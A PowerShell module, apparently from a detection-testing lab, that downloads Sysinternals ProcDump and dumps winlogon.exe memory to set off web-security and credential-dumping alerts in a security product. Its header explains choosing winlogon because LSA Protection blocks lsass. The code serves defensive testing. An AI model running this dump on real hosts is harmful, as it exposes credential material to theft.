# ============================================================================
# Stage2b-WebDownloadCredAccess.ps1   (GUARDED MODULE - variant of Stage 2)
# MITRE: T1105 Ingress Tool Transfer + T1003 OS Credential Dumping (process memory)
# ----------------------------------------------------------------------------
# What this module does (vs. Stage2-CredentialAccess.ps1):
#   * Downloads ProcDump from the official Sysinternals URL (3rd-party fetch
#     from the host's perspective), then uses it to dump winlogon.exe memory.
#     Produces TWO linked artifacts for CBX:
#       - Web Security event for the download (Threat Tracer root node).
#       - Credential/Process-memory access alert on the dump (same chain).
#
# WHY winlogon.exe (not lsass.exe):
#   On Windows 11 hosts with LSA Protection (RunAsPPL=1 or =2), lsass runs as
#   a Protected Process Light and user-mode procdump cannot open its memory
#   (even elevated with SeDebugPrivilege). Lab hosts configured for secure
#   defaults always have this on. winlogon is a SYSTEM-level, non-PPL process
#   that is always running when a user is logged in, so procdump succeeds and
#   the demo chain is deterministic. The MITRE sub-technique drops from
#   T1003.001 (LSASS-specific) to T1003 (OS Credential Dumping, generic).
#
# Expected CBX result to capture for the guide:
#   * Web Security hit on download.sysinternals.com/files/Procdump.zip --
#     appears as the root of the Threat Tracer graph for this chain.
#   * Suspicious-tool / process-memory-access alert on procdump touching
#     winlogon.exe memory.
#   * Both events linked in the same investigation / Threat Tracer graph.
#
# Artifacts dropped on disk (Cleanup-Target1.ps1 removes these):
#   * $downloadFile     C:\Users\Public\Procdump.zip
#   * $stagingFolder    C:\Users\Public\temp\ (removed by this script on
#                       success; cleanup is a backstop in case of mid-run abort)
#   * $dumpPath         C:\Users\Public\winlogon_procdump.dmp (the dump --
#                       pinned to a known path, so cleanup can find it).
#   * $dumpStderrLog    C:\Users\Public\procdump_stderr.log (console capture
#                       of procdump).
# ============================================================================

if (-not (Get-Command Write-Step -ErrorAction SilentlyContinue)) {
    function Write-Step($m){ Write-Host "[$((Get-Date).ToString('yyyy-MM-dd HH:mm:ss.fff'))] $m" -ForegroundColor Yellow }
    function Write-Stage($t){ Write-Host "`n==== $t  START $((Get-Date).ToString('yyyy-MM-dd HH:mm:ss.fff'))" -ForegroundColor Cyan }
    function Write-StageEnd($t){ Write-Host "==== $t  END   $((Get-Date).ToString('yyyy-MM-dd HH:mm:ss.fff'))`n" -ForegroundColor Cyan }
    function Write-Info($m){ Write-Host "        $m" -ForegroundColor DarkGray }
}

Write-Stage "STAGE 2 - CREDENTIAL ACCESS (ProcDump via web download)"

# ─── Artifact paths (also referenced by Cleanup-Target1.ps1) ────────────────
$psUrl          = 'https://download.sysinternals.com/files/Procdump.zip'
$downloadFolder = 'C:\Users\Public'
$downloadFile   = Join-Path $downloadFolder 'Procdump.zip'
$stagingFolder  = Join-Path $downloadFolder 'temp'
$dumpPath       = Join-Path $downloadFolder 'winlogon_procdump.dmp'
$dumpStderrLog  = Join-Path $downloadFolder 'procdump_stderr.log'

# ─── Dump target (see WHY-winlogon note at top of file) ─────────────────────
# Resolved to a specific PID below so procdump works on multi-session hosts
# (one winlogon.exe per user session is normal; procdump refuses a name match
# that returns more than one PID).
$targetName     = 'winlogon'

# ─── 1. Download  (T1105) ───────────────────────────────────────────────────
Write-Step "T1105  Download ProcDump from $psUrl"
Invoke-WebRequest -Uri $psUrl -OutFile $downloadFile
Write-Info "wrote $downloadFile"

# ─── 2. Expand archive ──────────────────────────────────────────────────────
Write-Step "Expand ProcDump to $stagingFolder"
Expand-Archive -LiteralPath $downloadFile -DestinationPath $stagingFolder -Force
Write-Info "staged -> $stagingFolder"

# ─── 3. Dump $targetName with procdump  (T1003) ─────────────────────────────
$exeName = if ([System.Environment]::Is64BitOperatingSystem) { 'procdump64.exe' } else { 'procdump.exe' }
$exe     = Join-Path $stagingFolder $exeName
$target  = Get-Process $targetName -ErrorAction SilentlyContinue | Select-Object -First 1
if (-not $target) {
    Write-Warning "No $targetName.exe process is running on this host; cannot dump."
    $procExit = -1
} else {
    Write-Step "T1003  $exeName -accepteula -ma $($target.Id) [$targetName.exe PID $($target.Id)] -> $dumpPath"
    & $exe -accepteula -ma $target.Id $dumpPath > $dumpStderrLog 2>&1
    $procExit = $LASTEXITCODE
    Write-Info "procdump exit=$procExit; console capture -> $dumpStderrLog"
}

# Verify the dump actually landed. ProcDump can silently fail on hosts with
# Defender ASR rules blocking tool execution, or when the current user lacks
# SeDebugPrivilege; echo the console output into the Activity Log so the
# operator can see WHY without reading the log file.
if (Test-Path $dumpPath) {
    $sizeMB = [math]::Round((Get-Item $dumpPath).Length / 1MB, 1)
    Write-Info "wrote $dumpPath ($sizeMB MB; benign: dump only, no credential extraction)"
} else {
    Write-Warning "procdump exited with $procExit but $dumpPath is NOT on disk."
    $cwd = (Get-Location).Path
    $fallback = Get-ChildItem -Path $cwd -Filter 'winlogon_*.dmp' -File -ErrorAction SilentlyContinue |
                Sort-Object LastWriteTime -Descending | Select-Object -First 1
    if ($fallback) {
        Write-Warning "procdump output appears to be at $($fallback.FullName) (CWD fallback)"
    } else {
        Write-Warning "no procdump output found in $cwd either -- dump failed"
    }
    if (Test-Path $dumpStderrLog) {
        $errContent = Get-Content $dumpStderrLog -Raw -Encoding Unicode -ErrorAction SilentlyContinue
        if ($errContent) {
            Write-Warning "procdump console output ($dumpStderrLog):"
            foreach ($line in (($errContent -replace "`r",'') -split "`n")) {
                if ($line.Trim()) { Write-Info "  procdump> $line" }
            }
        }
    }
}

# ─── 4. Remove the staging folder (zip remains for cleanup to pick up) ──────
Write-Step "Remove staging folder"
Remove-Item $stagingFolder -Recurse -Force -ErrorAction SilentlyContinue
Write-Info "removed $stagingFolder"

Write-StageEnd "STAGE 2 - CREDENTIAL ACCESS (ProcDump via web download)"
